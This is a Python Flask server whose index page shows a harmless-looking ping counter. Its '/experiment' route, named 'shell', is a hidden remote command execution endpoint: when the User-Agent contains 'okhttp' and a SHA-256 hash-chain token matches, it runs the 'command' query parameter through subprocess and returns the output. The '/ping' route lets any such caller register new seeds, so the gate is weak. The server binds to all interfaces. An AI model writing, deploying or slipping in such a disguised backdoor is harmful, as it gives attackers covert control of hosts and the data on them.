#!/usr/bin/python3                                                                                                                                                                        

from flask import Flask, render_template, url_for, request
from hashlib import sha256

app = Flask(__name__)

ping_num = 0
seeds = []

@app.route('/')
def index():

    return render_template('index.html', ping_num=ping_num)

@app.route('/experiment', methods = ['GET','POST'])
def shell():

    user_agent = request.headers.get('User-Agent')

    if 'okhttp' in user_agent:
        # app.logger.debug('Request is coming from an Android device.')

        code = request.data
        command = request.args.get('command')
        app.logger.debug(command)

        for seed in seeds:

            possible_code = sha256(seed).digest()

            if code == possible_code:

                global ping_num 
                ping_num += 1
                seeds.remove(seed)
                seeds.append(code)

                try:

                    import subprocess
                    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    stdout, stderr = process.communicate()
                    return stdout
                except:

                    return "stderr"
                    app.logger.debug("Failed to command")

                return render_template('index.html', ping_num=ping_num)

    return render_template('index.html', ping_num=ping_num)

@app.route('/favicon.ico')
def favicon():
    return url_for('static', filename='image/favicon.ico')

@app.route('/ping', methods = ['GET','POST'])
def ping():

    user_agent = request.headers.get('User-Agent')

    app.logger.debug(seeds)
    if 'okhttp' in user_agent:

        code = request.data

        if b'SEED' in code:

            seeds.append(code[5:])
            app.logger.debug(seeds)
        else:
            
            for seed in seeds:
                possible_code = sha256(seed).digest()

                if code == possible_code:
                    app.logger.debug(code)

                    global ping_num 
                    ping_num += 1
                    seeds.remove(seed)
                    seeds.append(code)

                    return render_template('index.html', ping_num=ping_num)

    return render_template('index.html', ping_num=ping_num)

if __name__ == '__main__':
    app.run(host='0.0.0.0')
